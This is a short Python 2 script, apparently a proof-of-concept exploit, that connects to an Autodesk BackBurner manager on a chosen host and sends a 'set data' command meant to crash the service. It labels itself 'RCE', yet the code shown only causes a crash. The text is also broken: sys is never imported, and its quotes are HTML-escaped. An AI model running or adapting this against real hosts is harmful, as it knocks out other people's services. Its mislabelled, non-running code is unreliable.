import datetime
import socket
import argparse
import os
import time
 
remote_host = &#039;&#039;
remote_port = &#039;&#039;
 
def callExit():
    print "\n\t\t[!] exiting at %s .....\n" % datetime.datetime.now()
    sys.exit(1)
 
def mySocket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print &#039;Failed to create socket&#039;
        sys.exit()
     
    print "\n\t[+] Socket Created"
     
    s.connect((remote_host, remote_port))
    print "\n\t[+] Socket Connected to %s on port %s" % (remote_host, remote_port)
     
    return s
     
# 250 backburner 1.0 Ready.
def receiveBanner(s):
    banner = s.recv(4096)
    print banner
 
 
def receiveData(s):
    data = s.recv(4096)
    print data
 
 
def setDataCommand(s):
    receiveData(s)          # backburner>
    print "Set Data Command"
    time.sleep(1)
    command = "set data\r\n"
    try:
        s.sendall(command)
    except socket.error:
        print &#039;Send failed&#039;
        sys.exit()
    print "BackBurner Manager should have crashed"
    receiveData(s)          # 200 Help
    receiveData(s)          # Available Commands:.....and all set of commands
                            # backburner>
 
 
def main():
    if sys.platform == &#039;linux-i386&#039; or sys.platform == &#039;linux2&#039; or sys.platform == &#039;darwin&#039;:
        os.system(&#039;clear&#039;)
 
    parser = argparse.ArgumentParser(description = &#039;RCE Autodesk BackBurner&#039;)
    parser.add_argument(&#039;--host&#039;, nargs=&#039;?&#039;, dest=&#039;host&#039;, required=True, help=&#039;remote IP of Autodesk host&#039;)
    parser.add_argument(&#039;--port&#039;, nargs=&#039;?&#039;, dest=&#039;port&#039;, default=3234, help=&#039;remote Port running manager.exe&#039;)
     
    args = parser.parse_args()
     
    if args.host == None:
        print "\t[!] IP of remote host?"
        sys.exit()
     
    global remote_host
    global remote_port
     
    remote_host = args.host
    remote_port = args.port
     
    print "remote_host: %s" % remote_host
    print "remote_port: %s" % remote_port
     
    s = mySocket()
    receiveBanner(s)
    setDataCommand(s)
     
    print &#039;exit&#039;
    sys.exit()
     
     
if __name__ == &#039;__main__&#039;:
    try: sys.exit(main())
    except KeyboardInterrupt:
        callExit()

